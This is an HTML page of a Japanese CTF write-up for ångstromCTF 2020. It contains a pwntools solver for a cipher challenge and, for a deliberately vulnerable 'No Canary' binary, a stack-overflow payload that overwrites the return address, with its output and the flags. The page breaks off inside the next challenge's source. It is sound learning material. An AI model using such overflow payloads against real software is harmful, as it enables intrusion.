<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <title>ångstromCTF 2020 Writeup - CTF フラxxグゲット</title>
  <meta name="renderer" content="webkit" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>

<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />

<meta name="theme-color" content="#f8f5ec" />
<meta name="msapplication-navbutton-color" content="#f8f5ec">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">


<meta name="author" content="CaptureAmerica @ CTF フラxxグゲット" /><meta name="description" content="(2020/03/20 - 復習しました) URL: https://2020.angstromctf.com/challenges 5日間のCTFでした。主に、初日の土曜日に頑張りました。 高校生によって作られたCTFのようですね。素晴らしいです。 ちな" /><meta name="keywords" content="CTF, Writeup, captureamerica, picoCTF" />



<meta name="google-site-verification" content="PqctLWZQttGzxXVupWuIt2HWuBI8cvN1z07ETpxA2dw" />


<meta name="generator" content="Hugo 0.74.2 with theme even" />


<link rel="canonical" href="https://captureamerica.github.io/writeups/post/angstromctf_2020/" />
<link rel="apple-touch-icon" sizes="180x180" href="https://captureamerica.github.io/writeups/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://captureamerica.github.io/writeups/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="https://captureamerica.github.io/writeups/favicon-16x16.png">
<link rel="manifest" href="https://captureamerica.github.io/writeups/manifest.json">
<link rel="mask-icon" href="https://captureamerica.github.io/writeups/safari-pinned-tab.svg" color="#5bbad5">



<link href="https://captureamerica.github.io/writeups/sass/main.min.2e81bbed97b8b282c1aeb57488cc71c8d8c8ec559f3931531bd396bf31e0d4dd.css" rel="stylesheet">



<meta property="og:title" content="ångstromCTF 2020 Writeup" />
<meta property="og:description" content="(2020/03/20 - 復習しました) URL: https://2020.angstromctf.com/challenges 5日間のCTFでした。主に、初日の土曜日に頑張りました。 高校生によって作られたCTFのようですね。素晴らしいです。 ちな" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://captureamerica.github.io/writeups/post/angstromctf_2020/" />
<meta property="article:published_time" content="2020-03-19T10:00:00+09:00" />
<meta property="article:modified_time" content="2020-03-20T09:00:00+09:00" />
<meta itemprop="name" content="ångstromCTF 2020 Writeup">
<meta itemprop="description" content="(2020/03/20 - 復習しました) URL: https://2020.angstromctf.com/challenges 5日間のCTFでした。主に、初日の土曜日に頑張りました。 高校生によって作られたCTFのようですね。素晴らしいです。 ちな">
<meta itemprop="datePublished" content="2020-03-19T10:00:00&#43;09:00" />
<meta itemprop="dateModified" content="2020-03-20T09:00:00&#43;09:00" />
<meta itemprop="wordCount" content="3294">



<meta itemprop="keywords" content="CTF,Reviewed," /><meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="ångstromCTF 2020 Writeup"/>
<meta name="twitter:description" content="(2020/03/20 - 復習しました) URL: https://2020.angstromctf.com/challenges 5日間のCTFでした。主に、初日の土曜日に頑張りました。 高校生によって作られたCTFのようですね。素晴らしいです。 ちな"/>

<!--[if lte IE 9]>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
<![endif]-->

<!--[if lt IE 9]>
  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
<![endif]-->

</head>
<body>
  <div id="mobile-navbar" class="mobile-navbar">
  <div class="mobile-header-logo">
    <a href="https://captureamerica.github.io/writeups/" class="logo">CTF Writeups</a>
  </div>
  <div class="mobile-navbar-icon">
    <span></span>
    <span></span>
    <span></span>
  </div>
</div>
<nav id="mobile-menu" class="mobile-menu slideout-menu">
  <ul class="mobile-menu-list">
    <a href="https://captureamerica.github.io/writeups/">
        <li class="mobile-menu-item">Home</li>
      </a><a href="https://captureamerica.github.io/writeups/post/">
        <li class="mobile-menu-item">Archives</li>
      </a><a href="https://captureamerica.github.io/writeups/tags/">
        <li class="mobile-menu-item">Tags</li>
      </a><a href="https://captureamerica.github.io/writeups/categories/">
        <li class="mobile-menu-item">Categories</li>
      </a><a href="https://captureamerica.github.io/writeups/about/">
        <li class="mobile-menu-item">About</li>
      </a>
  </ul>

  


</nav>

  <div class="container" id="mobile-panel">
    <header id="header" class="header">
        <div class="logo-wrapper">
  <a href="https://captureamerica.github.io/writeups/" class="logo">CTF Writeups</a>
</div>





<nav class="site-navbar">
  <ul id="menu" class="menu">
    <li class="menu-item">
        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/">Home</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/post/">Archives</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/tags/">Tags</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/categories/">Categories</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/about/">About</a>
      </li>
  </ul>
</nav>

    </header>

    <main id="main" class="main">
      <div class="content-wrapper">
        <div id="content" class="content">
          <article class="post">
    
    <header class="post-header">
      <h1 class="post-title">ångstromCTF 2020 Writeup</h1>

      <div class="post-meta">
        <span class="post-time"> 2020-03-19 </span>
        <div class="post-category">
            <a href="https://captureamerica.github.io/writeups/categories/ctf/"> CTF </a>
            </div>
        
      </div>
    </header>

    <div class="post-toc" id="post-toc">
  <h2 class="post-toc-title">Contents</h2>
  <div class="post-toc-content">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#misc-shifter-160-points">[Misc]: Shifter (160 points)</a>
      <ul>
        <li><a href="#challenge">Challenge</a></li>
        <li><a href="#solution">Solution</a></li>
      </ul>
    </li>
    <li><a href="#pwn-no-canary-50-points">[Pwn]: No Canary (50 points)</a>
      <ul>
        <li><a href="#challenge-1">Challenge</a></li>
        <li><a href="#solution-1">Solution</a></li>
      </ul>
    </li>
    <li><a href="#pwn-canary-70-points">[Pwn]: Canary (70 points)</a>
      <ul>
        <li><a href="#challenge-2">Challenge</a></li>
        <li><a href="#solution-2">Solution</a></li>
      </ul>
    </li>
    <li><a href="#reverse-taking-off-70-points">[Reverse]: Taking Off (70 points)</a>
      <ul>
        <li><a href="#challenge-3">Challenge</a></li>
        <li><a href="#solution-3">Solution</a></li>
      </ul>
    </li>
    <li><a href="#reverse-windows-of-opportunity-100-points">[Reverse]: Windows of Opportunity (100 points)</a>
      <ul>
        <li><a href="#challenge-4">Challenge</a></li>
        <li><a href="#solution-4">Solution</a></li>
      </ul>
    </li>
    <li><a href="#misc-psk-90-points">[Misc]: PSK (90 points)</a>
      <ul>
        <li><a href="#challenge-5">Challenge</a></li>
        <li><a href="#unsolved">(Unsolved)</a></li>
      </ul>
    </li>
    <li><a href="#misc-inputter-100-points">[Misc]: Inputter (100 points)</a>
      <ul>
        <li><a href="#challenge-6">Challenge</a></li>
        <li><a href="#unsolved-1">(Unsolved)</a></li>
      </ul>
    </li>
    <li><a href="#misc-all-these-rules--points">[Misc]: All These Rules (?? points)</a>
      <ul>
        <li><a href="#challenge-7">Challenge</a></li>
        <li><a href="#unsolved-2">(Unsolved)</a></li>
      </ul>
    </li>
    <li><a href="#misc-ws3-180-points">[Misc]: WS3 (180 points)</a>
      <ul>
        <li><a href="#challenge-8">Challenge</a></li>
        <li><a href="#solution-5">Solution</a></li>
      </ul>
    </li>
  </ul>
</nav>
  </div>
</div>
    <div class="post-content">
      <div class='align-right'>
<a href="https://translate.google.com/translate?hl=en&sl=ja&tl=en&u=https%3A%2F%2Fcaptureamerica.github.io%2Fwriteups%2Fpost%2Fangstromctf_2020%2F">
<img src="https://captureamerica.github.io/writeups/img/En.png" alt="English">
</a>
</div>
<p>(2020/03/20 - 復習しました)</p>
<p>URL: <a href="https://2020.angstromctf.com/challenges">https://2020.angstromctf.com/challenges</a>
<br /><br /></p>
<p>5日間のCTFでした。主に、初日の土曜日に頑張りました。</p>
<p>高校生によって作られたCTFのようですね。素晴らしいです。</p>
<p>ちなみに、過去のチャレンジ（2018年~）もアクセスできるみたいです。暇なときにやろうかと思います。</p>
<p>URL: <a href="https://2019.angstromctf.com/challenges">https://2019.angstromctf.com/challenges</a> <br>
URL: <a href="https://2018.angstromctf.com/challenges">https://2018.angstromctf.com/challenges</a></p>
<br>
最終順位は491位でした。
<img src="https://captureamerica.github.io/writeups/img/angstromctf_score.png" alt="angstromctf_score.png">
<br>
以下は解いたチャレンジです。
<img src="https://captureamerica.github.io/writeups/img/angstromctf_solves.png" alt="angstromctf_solves.png">
<p><br /><br /></p>
<h2 id="misc-shifter-160-points">[Misc]: Shifter (160 points)</h2>
<hr>
<h3 id="challenge">Challenge</h3>
<blockquote>
<p>What a strange challenge&hellip;
<br /><br />
It&rsquo;ll be no problem for you, of course!
<br /><br />
nc misc.2020.chall.actf.co 20300</p>
</blockquote>
<p><br /></p>
<h3 id="solution">Solution</h3>
<p>アクセスすると、以下のような出力が得られます。</p>
<pre>
$ nc misc.2020.chall.actf.co 20300
Solve 50 of these epic problems in a row to prove you are a master crypto man like Aplet123!
You'll be given a number n and also a plaintext p.
Caesar shift `p` with the nth Fibonacci number.
n < 50, p is completely uppercase and alphabetic, len(p) < 50
You have 60 seconds!
--------------------
Shift DYUWIYBIWFSRKVBNQFLNEUTRRPUTTVAYMNGDVCUQJIRUGJAX by n=40
: l.}.q.jq.n{zs~jvyntvm}|zzx}||~i.uvol~k}yrqz}ori.
Sorry, you got it wrong. The answer was EZVXJZCJXGTSLWCORGMOFVUSSQVUUWBZNOHEWDVRKJSVHKBY. Better luck next time!
</pre>
<br>
思いっきり答えを間違えると、ちゃんと正解を教えてもらえます^^
<p>以下が書いたコードです。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-Python" data-lang="Python"><span class="ch">#!/usr/bin/env python</span>
<span class="c1"># -*- coding:utf-8 -*-</span>

<span class="kn">import</span> <span class="nn">re</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;critical&#39;</span>

<span class="n">host</span><span class="p">,</span> <span class="n">port</span> <span class="o">=</span> <span class="s1">&#39;misc.2020.chall.actf.co&#39;</span><span class="p">,</span> <span class="mi">20300</span>
<span class="n">s</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">fib</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
    <span class="n">L</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">]</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
        <span class="n">L</span> <span class="o">+=</span> <span class="p">[</span> <span class="n">L</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="n">L</span><span class="p">[</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span> <span class="p">]</span>
    <span class="k">return</span> <span class="n">L</span><span class="p">[</span><span class="n">a</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">rot</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">n</span><span class="p">):</span>
    <span class="n">s</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
        <span class="k">if</span> <span class="mh">0x41</span> <span class="o">&lt;=</span> <span class="n">c</span> <span class="o">&lt;=</span> <span class="mh">0x5a</span><span class="p">:</span>
            <span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">((</span><span class="n">c</span><span class="o">-</span><span class="mh">0x41</span><span class="o">+</span><span class="n">n</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x1a</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x41</span>
        <span class="k">elif</span> <span class="mh">0x61</span> <span class="o">&lt;=</span> <span class="n">c</span> <span class="o">&lt;=</span> <span class="mh">0x7a</span><span class="p">:</span>
            <span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">((</span><span class="n">c</span><span class="o">-</span><span class="mh">0x61</span><span class="o">+</span><span class="n">n</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x1a</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x61</span>
    <span class="k">return</span> <span class="n">s</span>

<span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
    <span class="n">msg</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
    <span class="n">msg</span> <span class="o">=</span> <span class="n">msg</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
    <span class="c1"># Example:</span>
    <span class="c1"># Shift LFDTGUKDZBKGHWMEHRAAUQEYGXIHRTLFMXRCKURN by n=49</span>
    <span class="k">if</span> <span class="s2">&#34;Shift&#34;</span> <span class="ow">in</span> <span class="n">msg</span><span class="p">:</span>
        <span class="n">dat</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;Shift (.*) by.*&#34;</span><span class="p">,</span> <span class="n">msg</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
        <span class="n">n</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;.*n=(.*)&#34;</span><span class="p">,</span> <span class="n">msg</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>
        <span class="n">dat2</span> <span class="o">=</span> <span class="n">rot</span><span class="p">(</span><span class="n">dat</span><span class="p">,</span> <span class="n">fib</span><span class="p">(</span><span class="n">n</span><span class="p">))</span>
        <span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)</span>
        <span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">dat2</span><span class="p">)</span>
    <span class="k">elif</span> <span class="s2">&#34;actf{&#34;</span> <span class="ow">in</span> <span class="n">msg</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
        <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
        <span class="k">break</span>

</code></pre></td></tr></table>
</div>
</div><p>書いたと言っても、フィボナッチのコードは昔どこかのCTFでやったのが残っていたのと、rot関数はいつも使っているやつの使い回しなので、新規に書いた部分はちょっとだけです。</p>
<p><br /></p>
<p>Flag: <code>actf{h0p3_y0u_us3d_th3_f0rmu14-1985098}</code></p>
<p><br /><br />
<br /><br /></p>
<h2 id="pwn-no-canary-50-points">[Pwn]: No Canary (50 points)</h2>
<hr>
<h3 id="challenge-1">Challenge</h3>
<blockquote>
<p>Agriculture is the most healthful, most useful and most noble employment of man.</p>
</blockquote>
<p>Attachment:</p>
<ul>
<li>no_canary (ELF 64bit)</li>
<li>no_canary.c</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="kt">void</span> <span class="nf">flag</span><span class="p">()</span> <span class="p">{</span>
	<span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/cat flag.txt&#34;</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
	<span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
	<span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
	<span class="n">gid_t</span> <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
	<span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>

	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Ahhhh, what a beautiful morning on the farm!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;       _.-^-._    .--.&#34;</span><span class="p">);</span>
	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;    .-&#39;   _   &#39;-. |__|&#34;</span><span class="p">);</span>
	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;   /     |_|     </span><span class="se">\\</span><span class="s">|  |&#34;</span><span class="p">);</span>
	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;  /               </span><span class="se">\\</span><span class="s">  |&#34;</span><span class="p">);</span>
	<span class="n">puts</span><span class="p">(</span><span class="s">&#34; /|     _____     |</span><span class="se">\\</span><span class="s"> |&#34;</span><span class="p">);</span>
	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;  |    |==|==|    |  |&#34;</span><span class="p">);</span>
	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;  |    |--|--|    |  |&#34;</span><span class="p">);</span>
	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;  |    |==|==|    |  |&#34;</span><span class="p">);</span>
	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;^^^^^^^^^^^^^^^^^^^^^^^^</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Wait, what? It&#39;s already noon!&#34;</span><span class="p">);</span>
	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Why didn&#39;t my canary wake me up?&#34;</span><span class="p">);</span>
	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Well, sorry if I kept you waiting.&#34;</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;What&#39;s your name? &#34;</span><span class="p">);</span>

	<span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
	<span class="n">gets</span><span class="p">(</span><span class="n">name</span><span class="p">);</span>

	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Nice to meet you, %s!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p><br /></p>
<h3 id="solution-1">Solution</h3>
<p>なんかもう、オフセットサイズとかちゃんと調べず、適当に8バイトずつ値を何回か変えて試しました。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">gef➤  x flag
0x401186 &lt;flag&gt;:	0xe5894855
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">xxxxx@actf:/problems/2020/no_canary$ (python -c &#34;print(&#39;a&#39;*32+&#39;a&#39;*8+&#39;\x86\x11\x40\x00\x00\x00\x00\x00&#39;)&#34;; cat -) | ./no_canary
Ahhhh, what a beautiful morning on the farm!

       _.-^-._    .--.
    .-&#39;   _   &#39;-. |__|
   /     |_|     \|  |
  /               \  |
 /|     _____     |\ |
  |    |==|==|    |  |
  |    |--|--|    |  |
  |    |==|==|    |  |
^^^^^^^^^^^^^^^^^^^^^^^^

Wait, what? It&#39;s already noon!
Why didn&#39;t my canary wake me up?
Well, sorry if I kept you waiting.
What&#39;s your name? 
Nice to meet you, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�@!
actf{that_gosh_darn_canary_got_me_pwned!}
Segmentation fault
</code></pre></td></tr></table>
</div>
</div><p><br /></p>
<p>Flag: <code>actf{that_gosh_darn_canary_got_me_pwned!}</code></p>
<p><br /><br />
<br /><br /></p>
<h2 id="pwn-canary-70-points">[Pwn]: Canary (70 points)</h2>
<hr>
<h3 id="challenge-2">Challenge</h3>
<blockquote>
<p>A tear rolled down her face like a tractor. “David,” she said tearfully, “I don’t want to be a farmer no more.”
<br /><br />
—Anonymous
<br /><br />
Can you call the flag function in this program (source)? Try it out on the shell server at /problems/2020/canary or by connecting with nc shell.actf.co 20701.
<br /><br />
Hint: That printf call looks dangerous too&hellip;</p>
</blockquote>
<p>Attachment:</p>
<ul>
<li>canary (ELF 64bit)</li>
<li>canary.c</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C"><span class="cp">#define _GNU_SOURCE
</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="kt">void</span> <span class="nf">flag</span><span class="p">()</span> <span class="p">{</span>
	<span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/cat flag.txt&#34;</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">wake</span><span class="p">()</span> <span class="p">{</span>
	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Cock-a-doodle-doo! Cock-a-doodle-doo!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;        .-</span><span class="se">\&#34;</span><span class="s">-.&#34;</span><span class="p">);</span>
	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;       / 4 4 </span><span class="se">\\</span><span class="s">&#34;</span><span class="p">);</span>
	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;       </span><span class="se">\\</span><span class="s">_ v _/&#34;</span><span class="p">);</span>
	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;       //   </span><span class="se">\\\\</span><span class="s">&#34;</span><span class="p">);</span>
	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;      ((     ))&#34;</span><span class="p">);</span>
	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;=======</span><span class="se">\&#34;\&#34;</span><span class="s">===</span><span class="se">\&#34;\&#34;</span><span class="s">=======&#34;</span><span class="p">);</span>
	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;         |||&#34;</span><span class="p">);</span>
	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;         &#39;|&#39;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Ahhhh, what a beautiful morning on the farm!&#34;</span><span class="p">);</span>
	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;And my canary woke me up at 5 AM on the dot!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;       _.-^-._    .--.&#34;</span><span class="p">);</span>
	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;    .-&#39;   _   &#39;-. |__|&#34;</span><span class="p">);</span>
	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;   /     |_|     </span><span class="se">\\</span><span class="s">|  |&#34;</span><span class="p">);</span>
	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;  /               </span><span class="se">\\</span><span class="s">  |&#34;</span><span class="p">);</span>
	<span class="n">puts</span><span class="p">(</span><span class="s">&#34; /|     _____     |</span><span class="se">\\</span><span class="s"> |&#34;</span><span class="p">);</span>
	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;  |    |==|==|    |  |&#34;</span><span class="p">);</span>
	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;  |    |--|--|    |  |&#34;</span><span class="p">);</span>
	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;  |    |==|==|    |  |&#34;</span><span class="p">);</span>
	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;^^^^^^^^^^^^^^^^^^^^^^^^</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">greet</span><span class="p">()</span> <span class="p">{</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Hi! What&#39;s your name? &#34;</span><span class="p">);</span>
	<span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
	<span class="n">gets</span><span class="p">(</span><span class="n">name</span><span class="p">);</span>
